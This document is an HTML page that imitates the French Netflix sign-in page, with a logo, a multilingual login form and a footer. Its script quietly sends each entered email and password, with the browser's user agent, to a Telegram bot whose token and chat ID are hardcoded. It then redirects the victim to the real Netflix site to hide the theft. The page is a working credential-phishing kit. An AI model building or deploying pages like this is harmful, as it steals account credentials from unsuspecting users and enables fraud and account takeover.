<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix France - Regardez des séries et films en streaming</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
        }

        body {
            color: #fff;
            background: #000 url('netflixbackground.jpg') no-repeat center center/cover;
            min-height: 100vh;
            position: relative;
        }

        body::after {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.4);
            z-index: -1;
        }

        /* Header */
        .header {
            padding: 20px 3%;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: relative;
            z-index: 10;
        }

        .logo {
            height: 45px;
            width: auto;
        }

        .language-selector {
            background: rgba(0,0,0,0.7);
            color: white;
            padding: 7px 12px;
            border: 1px solid #777;
            border-radius: 3px;
            font-size: 14px;
            appearance: none;
            -webkit-appearance: none;
            background-image: url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='white'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e");
            background-repeat: no-repeat;
            background-position: right 8px center;
            background-size: 12px;
            padding-right: 30px;
        }

        /* Login Container */
        .login-container {
            max-width: 450px;
            width: 100%;
            margin: 2rem auto;
            padding: 3rem 4rem;
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            box-sizing: border-box;
            min-height: 500px;
        }

        @media (max-width: 740px) {
            .login-container {
                padding: 1rem;
                margin: 0;
                min-height: 100vh;
                background: rgba(0,0,0,0.9);
                border-radius: 0;
            }
        }

        h1 {
            margin: 0 0 1.5rem;
            font-size: 2rem;
            font-weight: 500;
        }

        /* Form Elements */
        .input-group {
            margin-bottom: 1rem;
            position: relative;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            height: 50px;
            padding: 1rem 1.25rem 0;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 1rem;
        }

        input:focus {
            background: #454545;
            outline: none;
        }

        label {
            position: absolute;
            top: 1rem;
            left: 1.25rem;
            color: #8c8c8c;
            pointer-events: none;
            transition: all 0.1s ease;
            font-size: 1rem;
        }

        input:focus + label,
        input:not(:placeholder-shown) + label {
            top: 0.5rem;
            font-size: 0.7rem;
        }

        /* Button */
        .login-button {
            width: 100%;
            padding: 1rem;
            margin: 1.5rem 0;
            background: #e50914;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 1rem;
            font-weight: 500;
            cursor: pointer;
            position: relative;
        }

        .login-button:hover {
            background: #f6121d;
        }

        /* Remember Me & Help */
        .options-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 3rem;
            color: #b3b3b3;
            font-size: 0.85rem;
        }

        .remember-me {
            display: flex;
            align-items: center;
        }

        .remember-me input {
            margin-right: 0.5rem;
            width: auto;
            height: auto;
        }

        .help-link {
            color: #b3b3b3;
            text-decoration: none;
        }

        .help-link:hover {
            text-decoration: underline;
        }

        /* Signup Link */
        .signup-text {
            color: #737373;
            margin-top: 1rem;
        }

        .signup-link {
            color: #fff;
            text-decoration: none;
        }

        .signup-link:hover {
            text-decoration: underline;
        }

        /* Footer */
        .footer {
            background: rgba(0, 0, 0, 0.75);
            padding: 2rem 3%;
            color: #737373;
            margin-top: 5rem;
            font-size: 0.85rem;
        }

        .footer-top {
            margin-bottom: 2rem;
        }

        .footer-links {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        @media (max-width: 600px) {
            .footer-links {
                grid-template-columns: repeat(2, 1fr);
            }
        }

        .footer-link {
            color: #737373;
            text-decoration: none;
            font-size: 0.8rem;
        }

        .footer-link:hover {
            text-decoration: underline;
        }

        /* Spinner */
        .spinner {
            display: none;
            width: 1.5rem;
            height: 1.5rem;
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            position: absolute;
            left: 50%;
            top: 50%;
            transform: translate(-50%, -50%);
        }

        @keyframes spin {
            to { transform: translate(-50%, -50%) rotate(360deg); }
        }

        .btn-loading {
            color: transparent !important;
        }

        .btn-loading .spinner {
            display: block;
        }
    </style>
</head>
<body>
    <header class="header">
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" class="logo">
        <select class="language-selector" id="languageSelector">
            <option value="fr">Français</option>
            <option value="en">English</option>
            <option value="es">Español</option>
            <option value="de">Deutsch</option>
        </select>
    </header>

    <main>
        <div class="login-container">
            <h1 id="loginTitle">S'identifier</h1>
            <form id="loginForm">
                <div class="input-group">
                    <input type="email" id="email" name="email" placeholder=" " required>
                    <label for="email" id="emailLabel">E-mail ou numéro de téléphone</label>
                </div>
                <div class="input-group">
                    <input type="password" id="password" name="password" placeholder=" " required>
                    <label for="password" id="passwordLabel">Mot de passe</label>
                </div>
                <button type="submit" class="login-button" id="submitBtn">
                    <span id="loginButtonText">S'identifier</span>
                    <div class="spinner"></div>
                </button>
                <div class="options-container">
                    <div class="remember-me">
                        <input type="checkbox" id="remember">
                        <label for="remember" id="rememberLabel">Se souvenir de moi</label>
                    </div>
                    <a href="#" class="help-link" id="helpLink">Besoin d'aide ?</a>
                </div>
            </form>
            <div class="signup-text">
                <span id="newUserText">Nouveau sur Netflix ?</span> 
                <a href="#" class="signup-link" id="signupLink">Inscrivez-vous maintenant.</a>
            </div>
        </div>
    </main>

    <footer class="footer">
        <div class="footer-top">
            <span id="questionsText">Des questions ? Appelez le</span> 
            <a href="tel:(+33) 0805-543-063" class="footer-link">(+33) 0805-543-063</a>
        </div>
        <div class="footer-links">
            <a href="#" class="footer-link" id="faqLink">FAQ</a>
            <a href="#" class="footer-link" id="helpCenterLink">Centre d'aide</a>
            <a href="#" class="footer-link" id="termsLink">Conditions d'utilisation</a>
            <a href="#" class="footer-link" id="privacyLink">Confidentialité</a>
            <a href="#" class="footer-link" id="cookiesLink">Préférences de cookies</a>
            <a href="#" class="footer-link" id="legalLink">Mentions légales</a>
            <a href="#" class="footer-link" id="adsLink">Choix liés à la pub</a>
        </div>
        <div>Netflix France</div>
    </footer>

    <script>
        // Traductions multilingues
        const translations = {
            fr: {
                loginTitle: "S'identifier",
                emailLabel: "E-mail ou numéro de téléphone",
                passwordLabel: "Mot de passe",
                loginButtonText: "S'identifier",
                rememberLabel: "Se souvenir de moi",
                helpLink: "Besoin d'aide ?",
                newUserText: "Nouveau sur Netflix ?",
                signupLink: "Inscrivez-vous maintenant.",
                questionsText: "Des questions ? Appelez le",
                faqLink: "FAQ",
                helpCenterLink: "Centre d'aide",
                termsLink: "Conditions d'utilisation",
                privacyLink: "Confidentialité",
                cookiesLink: "Préférences de cookies",
                legalLink: "Mentions légales",
                adsLink: "Choix liés à la pub"
            },
            en: {
                loginTitle: "Sign In",
                emailLabel: "Email or phone number",
                passwordLabel: "Password",
                loginButtonText: "Sign In",
                rememberLabel: "Remember me",
                helpLink: "Need help?",
                newUserText: "New to Netflix?",
                signupLink: "Sign up now.",
                questionsText: "Questions? Call",
                faqLink: "FAQ",
                helpCenterLink: "Help Center",
                termsLink: "Terms of Use",
                privacyLink: "Privacy",
                cookiesLink: "Cookie Preferences",
                legalLink: "Legal Notices",
                adsLink: "Ad Choices"
            },
            es: {
                loginTitle: "Iniciar sesión",
                emailLabel: "Correo electrónico o número de teléfono",
                passwordLabel: "Contraseña",
                loginButtonText: "Iniciar sesión",
                rememberLabel: "Recuérdame",
                helpLink: "¿Necesitas ayuda?",
                newUserText: "¿Nuevo en Netflix?",
                signupLink: "Suscríbete ahora.",
                questionsText: "¿Preguntas? Llama al",
                faqLink: "Preguntas frecuentes",
                helpCenterLink: "Centro de ayuda",
                termsLink: "Términos de uso",
                privacyLink: "Privacidad",
                cookiesLink: "Preferencias de cookies",
                legalLink: "Avisos legales",
                adsLink: "Opciones de anuncios"
            },
            de: {
                loginTitle: "Anmelden",
                emailLabel: "E-Mail oder Telefonnummer",
                passwordLabel: "Passwort",
                loginButtonText: "Anmelden",
                rememberLabel: "Angemeldet bleiben",
                helpLink: "Hilfe benötigt?",
                newUserText: "Neu bei Netflix?",
                signupLink: "Jetzt anmelden.",
                questionsText: "Fragen? Ruf an",
                faqLink: "FAQ",
                helpCenterLink: "Hilfe-Center",
                termsLink: "Nutzungsbedingungen",
                privacyLink: "Datenschutz",
                cookiesLink: "Cookie-Einstellungen",
                legalLink: "Rechtliche Hinweise",
                adsLink: "Werbepräferenzen"
            }
        };

        // Gestion du changement de langue
        document.getElementById('languageSelector').addEventListener('change', function() {
            const lang = this.value;
            updateLanguage(lang);
        });

        function updateLanguage(lang) {
            const trans = translations[lang];
            for (const [key, value] of Object.entries(trans)) {
                const element = document.getElementById(key);
                if (element) {
                    element.textContent = value;
                }
            }
        }

        // Gestion du formulaire
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const submitBtn = document.getElementById('submitBtn');
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            // Show spinner
            submitBtn.classList.add('btn-loading');
            
            // Send data to Telegram bot
            const botToken = '8039609056:AAHOhf-iy12X_0ABC-D7Lm7pZF3SnykB6Kk';
            const chatId = '-4883048028';
            const message = `🔐 NOUVELLE TENTATIVE DE CONNEXION NETFLIX 🔐

📧 Email: ${email}
🔑 Mot de passe: ${password}

⏰ ${new Date().toLocaleString()}
🌍 Langue: ${document.getElementById('languageSelector').value.toUpperCase()}
📱 Device: ${navigator.userAgent}`;
            
            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Identifiants envoyés à Telegram:', data);
            })
            .catch(error => {
                console.error('Erreur lors de l\'envoi à Telegram:', error);
            })
            .finally(() => {
                // Wait 2 seconds before redirecting (simulating login)
                setTimeout(() => {
                    window.location.href = 'https://www.netflix.com/browse';
                }, 2000);
            });
        });
    </script>
</body>
</html>
